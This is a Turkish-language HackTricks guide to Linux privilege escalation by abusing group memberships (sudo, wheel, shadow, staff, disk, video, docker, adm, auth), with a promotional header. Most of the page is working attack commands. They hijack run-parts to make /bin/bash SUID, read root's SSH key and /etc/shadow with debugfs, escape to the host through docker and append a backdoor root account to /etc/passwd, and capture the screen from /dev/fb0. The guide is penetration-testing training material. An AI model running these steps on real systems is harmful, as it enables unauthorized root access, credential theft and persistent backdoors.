# İlginç Gruplar - Linux İzin Yükseltme

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Sudo/Yönetici Grupları

### **PE - Yöntem 1**

**Bazen**, **varsayılan olarak (veya bazı yazılımların ihtiyaç duyması nedeniyle)** **/etc/sudoers** dosyasının içinde bu satırlardan bazılarını bulabilirsiniz:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Bu, **sudo veya admin grubuna ait herhangi bir kullanıcının sudo olarak herhangi bir şeyi çalıştırabileceği anlamına gelir**.

Bu durumda, **root olmak için sadece şunu çalıştırabilirsiniz**:
```
sudo su
```
### PE - Yöntem 2

Tüm suid ikili dosyaları bulun ve **Pkexec** ikilisinin olup olmadığını kontrol edin:
```bash
find / -perm -4000 2>/dev/null
```
Eğer **pkexec** ikili dosyasının bir **SUID ikili dosyası** olduğunu ve **sudo** veya **admin** gruplarından birine ait olduğunuzu tespit ederseniz, muhtemelen `pkexec` kullanarak ikili dosyaları sudo olarak çalıştırabilirsiniz.\
Bu genellikle **polkit politikası** içindeki gruplardır. Bu politika temelde hangi grupların `pkexec`'i kullanabileceğini belirler. Şununla kontrol edin:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Burada hangi grupların **pkexec**'i **ve varsayılan olarak** bazı Linux dağıtımlarında **sudo** ve **admin** gruplarının göründüğünü bulacaksınız.

**Root olmak için şunu çalıştırabilirsiniz**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Eğer **pkexec**'i çalıştırmaya çalışırsanız ve bu **hata** ile karşılaşırsanız:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**İzinlerinizin olmaması değil, GUI olmadan bağlı olmamanızdır**. Ve bu sorun için bir çözüm yolu burada bulunmaktadır: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2 farklı ssh oturumuna** ihtiyacınız vardır:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="oturum2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Grubu

**Bazen**, **varsayılan olarak** **/etc/sudoers** dosyasının içinde bu satırı bulabilirsiniz:
```
%wheel	ALL=(ALL:ALL) ALL
```
Bu, **wheel grubuna ait olan herhangi bir kullanıcının sudo olarak herhangi bir şeyi yürütebileceği anlamına gelir**.

Bu durumda, **root olmak için sadece şunu yürütmeniz yeterlidir**:
```
sudo su
```
## Shadow Grubu

**Grup shadow**'daki kullanıcılar **/etc/shadow** dosyasını **okuyabilirler**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
## İlginç Gruplar

**staff**: Kullanıcılara kök ayrıcalıklarına ihtiyaç duymadan sistemde yerel değişiklikler yapma izni verir (`/usr/local`) (not olarak `/usr/local/bin` içindeki yürütülebilir dosyalar, aynı isme sahip `/bin` ve `/usr/bin` içindeki yürütülebilir dosyaları "geçersiz kılabilir"). İzleme/güvenlik ile daha fazla ilgili olan "adm" grubu ile karşılaştırın. [\[kaynak\]](https://wiki.debian.org/SystemGroups)

Debian dağıtımlarında, `$PATH` değişkeni, ayrıcalıklı kullanıcı olup olmadığınıza bakılmaksızın `/usr/local/`'in en yüksek öncelikle çalıştırılacağını gösterir.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Eğer `/usr/local` içindeki bazı programları ele geçirebilirsek, kök erişim elde etmek kolay olacaktır.

`run-parts` programını ele geçirmek, kök erişim elde etmenin kolay bir yoludur, çünkü birçok program `run-parts` benzeri bir programı çalıştıracaktır (crontab, ssh girişi yapıldığında).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
veya Yeni bir ssh oturumu oturum açıldığında.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Sömürü**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Grubu

Bu ayrıcalık neredeyse **kök erişime eşdeğerdir** çünkü makinenin içindeki tüm verilere erişebilirsiniz.

Dosyalar: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Dikkat edin ki debugfs kullanarak ayrıca **dosya yazabilirsiniz**. Örneğin `/tmp/asd1.txt` dosyasını `/tmp/asd2.txt` dosyasına kopyalamak için şunu yapabilirsiniz:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ancak, **root'a ait dosyaları yazmaya çalışırsanız** (`/etc/shadow` veya `/etc/passwd` gibi) "**İzin Reddedildi**" hatası alırsınız.

## Video Grubu

`w` komutunu kullanarak **sisteme kimin oturum açtığını bulabilirsiniz** ve aşağıdaki gibi bir çıktı gösterecektir:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**, kullanıcının makinedeki bir terminalde **fiziksel olarak oturum açtığı** anlamına gelir.

**video grubu**, ekran çıktısını görüntüleme iznine sahiptir. Temelde ekranları gözlemleyebilirsiniz. Bunun için ekrandaki mevcut görüntüyü ham veri olarak **almanız** ve ekranın kullandığı çözünürlüğü almanız gerekir. Ekran verisi `/dev/fb0`'da kaydedilebilir ve bu ekranın çözünürlüğünü `/sys/class/graphics/fb0/virtual_size` üzerinde bulabilirsiniz.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**Raw görüntüyü** açmak için **GIMP** kullanabilirsiniz, \*\*`screen.raw` \*\* dosyasını seçin ve dosya türünü **Ham görüntü verisi** olarak seçin:

![](<../../../.gitbook/assets/image (287) (1).png>)

Ardından Genişlik ve Yüksekliği ekranda kullanılanlara göre değiştirin ve farklı Görüntü Türlerini kontrol edin (ve ekranda daha iyi gösterenini seçin):

![](<../../../.gitbook/assets/image (288).png>)

## Root Grubu

Varsayılan olarak **root grubunun üyelerinin**, **hakları yükseltmek** için kullanılabilecek **bazı hizmet** yapılandırma dosyalarını veya bazı **kütüphane** dosyalarını **değiştirebileceği** görünüyor...

**Root üyelerinin hangi dosyaları değiştirebileceğini kontrol edin**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Grubu

Makinenin kök dosya sistemini bir örneğin birimine bağlayabilirsiniz, böylece örnek başladığında hemen o birime bir `chroot` yükler. Bu size etkili bir şekilde makinede kök erişimi sağlar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
## lxc/lxd Grubu

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Grubu

Genellikle **`adm`** grubunun **üyeleri** _/var/log/_ dizininde bulunan **log** dosyalarını **okuma iznine** sahiptir.\
Bu nedenle, bu gruptaki bir kullanıcıyı ele geçirdiyseniz kesinlikle **loglara bakmalısınız**.

## Auth Grubu

OpenBSD içinde **auth** grubu genellikle _**/etc/skey**_ ve _**/var/db/yubikey**_ dizinlerine yazma iznine sahiptir.\
Bu izinler, aşağıdaki saldırıyı kullanarak **kök ayrıcalıklarına yükseltilebilir**: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
